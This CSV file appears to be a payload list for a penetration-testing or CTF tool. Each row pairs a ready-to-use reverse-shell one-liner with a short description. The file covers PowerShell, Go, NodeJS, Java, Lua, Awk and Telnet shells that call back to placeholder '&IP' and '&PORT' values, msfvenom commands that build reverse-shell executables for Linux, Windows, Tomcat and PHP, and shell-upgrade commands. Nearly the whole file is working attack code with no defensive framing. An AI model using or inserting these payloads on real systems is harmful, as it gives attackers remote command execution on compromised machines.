payload,description
"powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client=New-Object System.Net.Sockets.TCPClient('&IP',&PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",PowerShell — TCPClient full (Windows)
"powershell -nop -c ""$client=New-Object System.Net.Sockets.TCPClient('&IP',&PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",PowerShell — TCPClient v2 (Windows)
"echo 'package main;import""os/exec"";import""net"";func main(){c,_:=net.Dial(""tcp"",""&IP:&PORT"");cmd:=exec.Command(""/bin/sh"");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",Golang — compile+run+cleanup
"node -e ""require('child_process').exec('bash -i >& /dev/tcp/&IP/&PORT 0>&1')""",NodeJS — child_process bash TCP
"node -e ""var net=require('net'),sh=require('child_process').spawn('/bin/sh',[]);var c=new net.Socket();c.connect(&PORT,'&IP',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});""",NodeJS — net.Socket pipe /bin/sh
"Runtime r=Runtime.getRuntime();Process p=r.exec(""/bin/bash -c 'exec 5<>/dev/tcp/&IP/&PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'"");p.waitFor();",Java — Runtime.exec bash TCP (servlet/OGNL)
"lua -e ""require('socket');require('os');t=socket.tcp();t:connect('&IP','&PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');""",Lua — socket.tcp exec
"awk 'BEGIN {s = ""/inet/tcp/0/&IP/&PORT""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",Awk — /inet/tcp reverse shell
telnet &IP 8080 | /bin/sh | telnet &IP &PORT,Telnet — dual listener (8080+&PORT)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=&IP LPORT=&PORT -f elf -o /tmp/shell.elf,MSFVenom — Linux ELF x64
msfvenom -p linux/x86/shell_reverse_tcp LHOST=&IP LPORT=&PORT -f elf -o /tmp/shell.elf,MSFVenom — Linux ELF x86
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&IP LPORT=&PORT -f exe -o shell.exe,MSFVenom — Windows EXE x64
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&IP LPORT=&PORT -f war > reverse.war,MSFVenom — Java WAR (Tomcat)
msfvenom -p php/reverse_php LHOST=&IP LPORT=&PORT -f raw > shell.php,MSFVenom — PHP raw
"python3 -c 'import pty;pty.spawn(""/bin/bash"")'",Upgrade TTY — pty.spawn bash
"python -c 'import pty;pty.spawn(""/bin/bash"")'",Upgrade TTY — python2
script -qc /bin/bash /dev/null,Upgrade TTY — script
stty raw -echo; fg,Upgrade TTY — stty raw (après Ctrl+Z)
export TERM=xterm-256color; export SHELL=bash,Upgrade TTY — export TERM SHELL
